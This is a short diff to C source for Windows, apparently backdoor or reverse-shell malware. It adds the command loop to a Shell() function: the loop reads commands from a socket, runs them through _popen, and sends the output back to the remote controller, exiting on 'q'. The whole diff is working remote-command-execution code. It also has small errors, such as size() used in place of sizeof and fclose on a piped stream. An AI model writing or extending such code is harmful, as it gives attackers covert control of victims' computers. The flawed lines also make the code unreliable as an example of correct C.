@@ -26,6 +26,20 @@ void Shell() {
 			bzero(total_response, sizeof(total_response));
 
 			recv(sock, buffer, 1024, 0);
+			
+			if(strncmp("q", buffer, 1) == 0) {
+				closesocket(sock);
+				WSACleanup();
+				exit(0);
+			} else {
+				FILE *fp;
+				fp = _popen(buffer, "r");
+				while (fgets(container, 1024, fp) != NULL) {
+					strcat(total_response, container);
+				}
+				send(sock, total_response, size(total_response), 0);
+				fclose(fp);
+			}
 	}
 }
 
